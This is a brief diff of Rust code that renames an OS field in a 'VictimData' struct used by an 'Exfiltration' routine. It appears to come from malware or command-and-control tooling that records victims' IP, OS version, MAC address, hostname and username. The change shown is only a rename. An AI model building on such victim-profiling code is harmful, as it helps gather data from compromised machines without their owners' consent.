@@ -21,7 +21,7 @@ struct InstanceData {
 #[derive(Serialize)]
 struct VictimData {
     address: String,
-    operating_system: String,
+    operating_system_version: String,
     mac_address: String,
     hostname: String,
     username: String,
@@ -84,7 +84,7 @@ impl Exfiltration {
                     Some(socket) => socket.ip().to_string(),
                     None => "Unknown".into(),
                 },
-                operating_system: data.0.operating_system,
+                operating_system_version: data.0.operating_system_version,
                 mac_address: data.0.mac_address,
                 hostname: data.0.hostname,
                 username: data.0.username,
